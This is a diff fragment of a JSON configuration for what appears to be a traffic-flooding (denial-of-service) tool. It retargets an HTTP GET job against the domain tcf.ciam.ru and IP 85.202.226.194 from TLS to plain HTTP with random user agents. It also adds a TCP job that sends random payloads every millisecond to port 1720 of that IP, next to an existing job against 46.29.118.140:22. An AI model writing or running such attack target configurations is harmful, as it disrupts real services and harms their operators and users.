@@ -6699,10 +6699,7 @@
           "type": "net",
           "args": {
             "protocol": "tcp",
-            "address": "85.202.226.194:443",
-            "tls_config": {
-              "insecure_skip_verify": true
-            }
+            "address": "85.202.226.194:80"
           }
         },
         "packet": {
@@ -6710,7 +6707,7 @@
             "type": "http",
             "data": {
               "method": "GET",
-              "path": "https://tcf.ciam.ru",
+              "path": "http://tcf.ciam.ru",
               "headers": {
                 "User-Agent": "{{ random_user_agent }}"
               }
@@ -12739,6 +12736,16 @@
       "name": "46.29.118.140",
       "args": {
         "address": "46.29.118.140:22",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 2,
+      "name": "85.202.226.194",
+      "args": {
+        "address": "85.202.226.194:1720",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
